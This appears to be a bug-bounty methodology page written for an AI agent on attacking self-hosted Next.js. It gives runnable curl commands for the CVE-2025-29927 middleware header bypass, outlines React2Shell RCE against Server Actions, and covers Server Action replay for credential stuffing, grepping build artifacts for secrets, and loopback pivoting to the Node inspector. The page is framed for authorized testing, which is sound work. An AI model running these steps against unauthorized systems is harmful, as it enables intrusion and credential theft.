---
technology: Next.js
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: web-platforms
evidence: "3 writeups (see ../internal coverage ledger)"
provenance: "corpus-mined from 3 strict-gated writeups in the writeup corpus + upstream-verified: GHSA-f82v-jwr5-mffw + Vercel blog CVE-2025-29927 (x-middleware-subrequest skip, affected/fixed version matrix, self-hosted scope, proxy-strip workaround), react.dev RSC advisory + nextjs.org CVE-2025-66478 + Tenable/Microsoft/Qualys/Sonatype analyses of CVE-2025-55182 React2Shell (Flight deserialization, React 19 react-server-dom-* 19.0.0/19.1.0/19.1.1/19.2.0, Next.js App Router version matrix, fixed lines, Pages Router unaffected). Accessed 2026-11-12"
---

Companion page: [[next-js|Next.js overview]] — the fused client/server model and where its boundaries break. The Node.js runtime underneath (inspector on 9229, `--inspect` flags, debugger exploitation) is the [[node-express]] unit; npm/registry attack surfaces are the [[package-managers]] unit. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Next.js Bug Bounty Methodology

**Scope:** framework-level attack surface of self-hosted Next.js — fingerprinting to a version pin, middleware authorization bypass (CVE-2025-29927), React Server Components deserialization RCE (CVE-2025-55182 "React2Shell" / Next.js CVE-2025-66478), Server Action replay, `.next/` build-artifact mining, and loopback escalation handoffs. **Out of scope:** application-level bugs in the target's own route handlers (generic web methodology), React client-side XSS, and the Node inspector exploitation technique itself ([[node-express]]).

**Authorization:** presume written permission. The deserialization class is unauthenticated pre-auth RCE — on production scope, confirm the engagement permits RCE proof before firing public PoC payloads, and prefer a computed marker (`id`, hostname) over a shell.

## Decision tree (one screen)

1. `X-Powered-By: Next.js` / `__next` assets / next-version pin recovered → Phase 2.
2. Version in CVE-2025-29927 range + routes that should be gated → Phase 3 (header bypass) — cheapest, always try first.
3. App Router + React 19 stack in CVE-2025-55182 range (15.x any-to-fixed-line, 16.0.0–16.0.6, ≥14.3.0-canary.77) → Phase 4 (React2Shell).
4. Any file read / LFI / exposed repo → Phase 6 (`.next/` artifact mining) first — creds may end the engagement faster.
5. Foothold as app user → Phase 7 (loopback: inspector 9229, DBs) — hand the debugger work to [[node-express]].

## Phase 1 — Fingerprint and deployment shape

```bash
curl -sI https://example.com/ | grep -i "x-powered-by"        # X-Powered-By: Next.js (unless suppressed)
curl -s https://example.com/ | grep -oE '/_next/static/[^"]+'  # build id + asset layout
nmap -sV -p 3000,443,80 example.com                            # nmap fingerprints Next.js/React banners too
```

Establish: server deployment (`next start` / standalone container — both CVE classes apply) vs static export (neither applies) vs platform-hosted (middleware header class largely neutralized). Watch response headers and error pages: `x-nextjs-*` headers, the Dev overlay, and 404 shapes all distinguish the modes.

## Phase 2 — Version pin recovery

```bash
# repo exposure / file read
cat package.json | grep -E '"(next|react|next-auth)"'          # "next": "15.2.2" style pins
cat next.config.js                                             # config: output mode, headers, rewrites
ls .next/ && cat .next/routes-manifest.json | head             # build exists = server deployment
# rendered HTML: build id, framework markers
curl -s https://example.com/ | grep -oE '"buildId":"[^"]+"'
```

Map the pin against the two matrices (upstream-verified): CVE-2025-29927 affects `>=11.1.4 <12.3.5`, `13.0.0–13.5.8`, `14.0.0–14.2.24`, `15.0.0–15.2.2`; CVE-2025-55182 affects App Router on `14.3.0-canary.77+`, all `15.x` below the per-line fix, and `16.0.0–16.0.6` (fixed: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7; React packages 19.0.0/19.1.0/19.1.1/19.2.0 → 19.0.1/19.1.2/19.2.1). A `next@15.2.2` pin is middleware-bypassable but React2Shell-patched; `15.0.x` is both. Pages Router kills the React2Shell class regardless of version.

## Phase 3 — Middleware authorization bypass (CVE-2025-29927)

```bash
# pick a route that middleware guards (login-gated dashboards, /admin, API routes)
curl -s -o /dev/null -w "%{http_code}\n" https://example.com/admin
curl -s -o /dev/null -w "%{http_code}\n" -H "X-Middleware-Subrequest: middleware" https://example.com/admin
# public PoCs repeat the name as a colon chain when the exact middleware name is unknown:
#   X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

Interpretation: a status/behavior change (302→200, redirect dropped, protected content served) means the middleware run was skipped via the internal recursion header — authorization that existed only in `middleware.ts` is gone. Adjust the name token to the app's middleware filename if recon exposed it (source, `.next/server/middleware.js`, error pages). Remember the defender-side mitigation is a proxy strip of the header: if a fronting proxy is suspected, retest against the origin port directly. On success, walk every gated route systematically — the bypass exposes them all at once.

## Phase 4 — RSC deserialization RCE (CVE-2025-55182 "React2Shell")

Preconditions: App Router + React 19 in range (Phase 2). Unauthenticated; any Server Function endpoint is an entry point, and apps are affected even without explicit Server Functions usage because the RSC runtime handles Flight payloads for normal rendering too.

```bash
# identify a Server Action endpoint: rendered forms carry hidden $ACTION_ID fields
curl -s https://example.com/ | grep -oE '\$ACTION_[A-Z0-9_:]+' | sort -u
# public exploit tooling (react2shell.com PoC family) sends a crafted Flight payload
# to a Server Function endpoint; proof-of-execution form:
#   POST /target-route  (headers: Next-Action: <action-id>, Content-Type: text/x-component or multipart)
#   payload: crafted Flight structure → prototype pollution → module require → `id`/marker output
```

Run the public PoC against a local pinned copy of the target's version first (`npm install next@<pin>` + `create-next-app`) to confirm exploitability and calibrate the payload, then prove execution on target with a non-destructive marker. Post-exploitation identity is the Node process user — move to Phase 7.

## Phase 5 — Server Action replay (framework plumbing, always available)

```bash
# harvest the action plumbing from rendered pages
curl -s https://example.com/login | grep -oE 'name="\$ACTION[^"]*" [^>]*value="[^"]*"'
# replay: POST with Next-Action header + the $ACTION_* form fields
curl -X POST https://example.com/login \
     -H "Next-Action: <action-id>" \
     --data-urlencode '$ACTION_KEY=<key>' --data-urlencode 'field=value'
```

Server Actions are ordinary scriptable endpoints once their ids and field shapes are parsed out of HTML — use them to drive server-side logic at wordlist speed (credential stuffing through a login action, injection into an action parameter, LDAP/wildcard oracles behind a form action). This is plumbing, not a bug: it makes every other bug class faster.

## Phase 6 — `.next/` build-artifact mining

```bash
# given traversal / repo read / directory exposure
cat .next/routes-manifest.json        # every route incl. unlinked internals
ls .next/server/                      # compiled pages, middleware, chunks
strings .next/server/*.js | grep -iE "passw|secret|api[_-]?key|token|postgres://|mysql://"
```

Compiled server chunks keep string literals: database URLs, API keys, service credentials "server-only" code assumed safe. The manifest exposes routes no UI links to. If only one file can be read, prefer `routes-manifest.json` for mapping and a server chunk for secrets. Compiled server files have also yielded user credentials directly — treat them as source, not as binaries.

## Phase 7 — Loopback escalation handoff

```bash
ss -ltnp | grep -E "9229|5432|6379|27017"      # inside the Next.js process's host/netns
ps aux | grep -E "node|next" | grep -E "inspect|standalone"
# inspector found: tunnel and pivot to [[node-express]] methodology (V8 inspector protocol → code exec as app user)
```

A standalone-style deployment often co-locates everything the app talks to on loopback or an internal netns; the Node inspector (`--inspect` on 127.0.0.1:9229) is the highest-value neighbor. SSRF through the Next.js app (image optimization endpoints, fetch-based routes) reaches the same surface from outside when direct shell access is lacking.

## Appendix A — Tool map (tools vault owns per-tool detail)

- **curl** — header manipulation for the bypass test, Server Action replay, artifact probing.
- **nmap** — service/version fingerprinting incl. Next.js/React HTTP banners.
- **Node.js / npm** — pinning a local copy of the target's `next@<version>` for PoC calibration.
- **React2Shell PoC tooling** — public exploit family for CVE-2025-55182 (react2shell.com lineage); validate against a local repro before firing at scope.
- **Proxy suites (Burp/mitmproxy)** — request interception for cookie/header inventory (`next-auth.csrf-token` style cookies flag auth-in-middleware designs) and action-field capture.
- **V8 inspector tooling** — the 9229 escalation path, documented in the [[node-express]] unit.
